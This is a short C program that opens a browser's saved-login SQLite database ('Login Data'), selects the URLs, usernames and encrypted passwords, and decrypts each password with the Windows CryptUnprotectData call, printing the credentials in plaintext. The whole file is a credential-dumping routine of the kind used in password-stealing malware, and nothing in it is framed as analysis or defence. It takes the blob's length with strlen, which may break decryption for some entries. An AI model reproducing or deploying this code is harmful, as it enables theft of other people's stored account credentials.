#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Wincrypt.h>
#include "sqlite3.h"

static int callback(void *data, int argc, char **argv, char **azColName){
   int i;
   fprintf(stderr, "%s: \n", (const char*)data);
   for(i=0; i<argc; i++){
      if (i == 2 ){
        DATA_BLOB DataIn;
        DATA_BLOB DataOut;
        BYTE *pbDataInput = (BYTE *) argv[i];
        DWORD cbDataInput = strlen((char *) pbDataInput) + 1;
        DataIn.pbData = pbDataInput;
        DataIn.cbData = cbDataInput;
        if (CryptUnprotectData (&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut))
          printf("%s\n", DataOut.pbData);
        else
          printf("Error number %x.\n", GetLastError());
      }
      // printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
   }
   printf("\n");
   return 0;
}

int main(int argc, char* argv[])
{
   sqlite3 *db;
   char *zErrMsg = 0;
   int rc;
   char *sql;
   const char* data = "Callback function called";

   /* Open database */
   rc = sqlite3_open("Login Data.db", &db);
   if( rc ){
      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
      return(0);
   }else{
      fprintf(stderr, "Opened database successfully\n");
   }

   /* Create SQL statement */
   sql = "SELECT action_url, username_value, password_value from logins";

   /* Execute SQL statement, */
   rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);
   if( rc != SQLITE_OK ){
      fprintf(stderr, "SQL error: %s\n", zErrMsg);
      sqlite3_free(zErrMsg);
   }else{
      fprintf(stdout, "Operation done successfully\n");
   }
   sqlite3_close(db);
   return 0;
}